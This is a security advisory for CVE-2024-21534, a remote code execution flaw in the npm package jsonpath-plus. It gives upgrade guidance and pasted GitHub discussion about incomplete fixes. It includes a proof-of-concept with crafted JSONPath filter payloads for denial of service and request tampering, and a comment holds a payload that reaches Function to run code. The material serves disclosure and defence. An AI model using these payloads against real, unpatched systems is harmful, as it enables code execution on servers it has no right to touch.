#### Introduced: 10 Sep 2024

[CVE-2024-21534  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2024-21534) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-94  (opens in a new tab)](https://cwe.mitre.org/data/definitions/94.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

Upgrade `jsonpath-plus` to version 10.2.0 or higher.

## Overview

[jsonpath-plus](https://www.npmjs.org/package/jsonpath-plus) is an A JS implementation of JSONPath with some additional operators

Affected versions of this package are vulnerable to Remote Code Execution (RCE) due to improper input sanitization. An attacker can execute aribitrary code on the system by exploiting the unsafe default usage of `vm` in Node.

**Note:**

There were several attempts to fix it in versions [10.0.0-10.1.0](https://github.com/JSONPath-Plus/JSONPath/compare/v9.0.0...v10.1.0) but it could still be exploited using [different payloads](https://github.com/JSONPath-Plus/JSONPath/issues/226).

## PoC

```
const { JSONPath } = require("jsonpath-plus");

const pathDoS =
  "$[?(con = constructor; dp = con.defineProperty; gopd = con.getOwnPropertyDescriptor; f = gopd(con, 'entries').value; alt = gopd(con.getPrototypeOf(f), 'apply'); dp(con.getPrototypeOf(_$_root.body), 'toString', alt);)]";
const pathSsrf =
  "$[?(con = constructor; dp = con.defineProperty; dp(con.prototype, 'referrer', _$_root.referrer); dp(con.prototype, 'method', _$_root.method); dp(con.prototype, 'body', _$_root.body);)]";

const result = JSONPath({
  json: {
    referrer: {
      value: "http://authorized.com",
      writable: true,
    },
    method: {
      value: "POST",
      writable: true,
    },
    body: {
      value: "Hello, World!",
      writable: true,
    },
  },
  path: pathDoS,
});

result.toString(); //DoS

//fetch("http://localhost:3000"); // ssrf with possible privilege escalation via lateral movement

| Our "safe" vm had an issue here, so switching to use that vm by default indeed did not fix the RCE bug. I've released a new patch for the safe vm which throws upon `Function` access within member expressions. If there are other pathways to `Function` or such, they may still be vulnerable. |

| [@zmiele](https://github.com/zmiele) : I think that would really gut the library given how frequently filters are used and expected. Since we have been fixing all known vulnerabilities, and since the "safe" evaluator is a subset of JavaScript under our control, I think we should be able to get it right. It's just not such a trivial matter and could benefit from review by more eyes, especially those familiar with security circumvention techniques. |

| [@brettz9](https://github.com/brettz9) oh I just saw your comment, thank you for update!  ~~Just my opinion, but I don't know if it will help.~~ ~~How about throwing an error when the name of the property/object is a constructor in `evalMemberExpression`?~~  ```   evalMemberExpression(ast, subs) {     if ((ast.property.type === "Identifier" && ast.property.name === "constructor")||(ast.object.type === "Identifier" && ast.object.name === "constructor")) throw new Error("cannot read property 'constructor'")     const prop = ast.computed ? SafeEval.evalAst(ast.property) // `object[property]`     : ast.property.name; // `object.property` property is Identifier ```  ~~Except in situations where external functions are passed via `json`, as shown below, It could prevent to access `Function`🤔~~  ``` const { JSONPath } = require("jsonpath-plus");  JSONPath({     path: '$[?(@root.a.get(constructor, "constructor").call([]"console.log(123)")())]',     json: { a: Reflect }, }); ``` |

| Hi [@brettz9](https://github.com/brettz9) I am trying to reproduce the vulnerability reported and fixed in this thread. I am using older versions of the package, without success.  For context, I create hands-on labs to learn about Runtime Security (threat detection), Vulnerability Management, and compliance. I would like to include this CVE as an example of a vulnerability discovered and fixed, how to detect an RCE exploit, and how to mitigate it and reduce risk with VM tools.  I have reviewed all the information available but still can't reproduce the vulnerability. Can we take a look together to understand which steps I should follow?  Here's my setup: <https://gist.github.com/pabloopez/da3a7f5ca5631b3dc00d7d9d3790b9af>  Using nodejs version 18 and JSONPath-plus vs 9.0.0  Any comment is welcomed! |

| [@DBaack11](https://github.com/DBaack11) : In the past, they seem to have tested without reporting, but I've reported it just now just in case.  [@hqtoan94](https://github.com/hqtoan94) : I'm guessing they may just default to assuming it is not fixed until they have time to review. I haven't been informed of there still being issues, but we'll see. |

| [@hqtoan94](https://github.com/hqtoan94) I confirmed locally that 10.2.0 fixed the current POC reported by Snyk. We'll see if it's resolved when they review.  [@brettz9](https://github.com/brettz9) I believe you are correct, looks like it automatically increments. Thank you for being so responsive! |
